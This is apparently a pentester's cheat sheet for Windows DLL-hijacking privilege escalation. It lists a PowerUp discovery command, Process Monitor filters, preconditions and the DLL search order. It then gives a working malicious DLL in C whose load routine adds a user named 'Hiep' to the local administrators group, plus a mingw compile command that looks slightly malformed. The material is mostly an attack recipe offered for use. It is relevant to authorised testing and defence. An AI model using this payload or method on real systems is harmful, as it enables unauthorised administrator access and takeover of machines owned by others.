**PowerUp**
```powersploit
Find-ProcessDLLHijack -ExcludeWindows -ExcludeProgramFiles -ExcludeOwned
```
**Process Monitor** (filter: path ends with .dll, result NAME NOT FOUND)
- [ ] Service with Administrative privileges
- [ ] Run, stop, restart service permission
- [ ] Writeable Directory
Search order:
- Directory application is in
- System directory, C:\Windows\System32
- 16-bit system directory, C:\Windows\System
- Current working directory
- PATH environment variables
```C
#include <windows.h> 

BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) { 

	if (dwReason == DLL_PROCESS_ATTACH) { 
		system("cmd.exe /k net localgroup administrators Hiep /add"); 
		ExitProcess(0); 
	} 
	return TRUE; 
}
```
Compiling DLL
```bash
x86_64-w64-mingw32-gcc windows <input file> -shared -o <output>
```